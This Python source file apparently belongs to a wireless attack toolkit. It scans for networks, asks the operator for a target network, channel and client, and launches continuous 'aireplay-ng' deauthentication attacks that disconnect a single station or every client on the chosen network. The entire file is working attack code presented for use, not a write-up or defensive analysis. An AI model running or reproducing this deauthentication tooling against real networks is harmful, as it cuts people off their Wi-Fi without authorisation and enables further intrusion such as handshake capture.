'''
'''

import os
import subprocess

from rich.prompt import Prompt

from constants import console 
from attacks_utils import *

def deauth(selected_interface, target_network_bssid, target_station_bssid=None):
    '''
    '''
    console.print(f'[info]Starting attack #################################################')

    type_attack = ''
    # verify what type of attack is
    if target_station_bssid:
        type_attack = f'-c {target_station_bssid}'
  
    # call the function to arttack selected network
    subprocess.call(['xterm', '-e', f'sudo aireplay-ng -0 0 -a {target_network_bssid} {type_attack} {selected_interface}'])
    console.print(f'[good]Attack finished successfully')
    console.print(f'[info]Attack finished #################################################')
    sleep(2)

def deauth_all(selected_interface, target_network_bssid, channel_of_network_to_attack):
    '''
    '''
    console.print(f'[info]Starting attack #################################################')

    # clean the channel
    clean_interface(selected_interface)
    # start the interface in the selected channel
    set_monitor_mode(selected_interface=selected_interface, specified_channel=channel_of_network_to_attack)
    # call the function to attack selected network
    subprocess.call(['xterm', '-e', f'sudo aireplay-ng -0 0 -a {target_network_bssid} {selected_interface}'])
    console.print(f'[good]Attack finished successfully')
    console.print(f'[info]Attack finished #################################################')
    sleep(2)

def single_target_attack(selected_interface):
    '''
    '''
    # show all available networks
    show_available_networks(selected_interface)

    # user select the network and channel to attack
    # select channel
    network_to_attack =  Prompt.ask('Select the network to attack (BSSID)')
    console.print(f'[info]Selected network to attack {network_to_attack}')
    # select the channel
    channel_of_network_to_attack =  Prompt.ask('Select the channel (CH) of the network to attack')
    console.print(f'[info]Selected channel of the network to attack {channel_of_network_to_attack}')

    # monitor the selected network
    monitor_selected_network(selected_interface, network_to_attack, channel_of_network_to_attack)

    # user select the target
    target_bssid = Prompt.ask('Select the target station (BSSID)')

    # do the deauth attack
    deauth(selected_interface, network_to_attack, target_bssid)

def all_targets_attack(selected_interface):
    '''
    '''
    # show all available networks
    show_available_networks(selected_interface)

    # user select the network and channel to attack
    # select channel
    network_to_attack =  Prompt.ask('Select the network to attack (BSSID)')
    console.print(f'[info]Selected network to attack {network_to_attack}')

    # select the channel
    channel_of_network_to_attack =  Prompt.ask('Select the channel (CH) of the network to attack')
    console.print(f'[info]Selected channel of the network to attack {channel_of_network_to_attack}')

    # do the deauth attack
    deauth_all(selected_interface, network_to_attack, channel_of_network_to_attack)
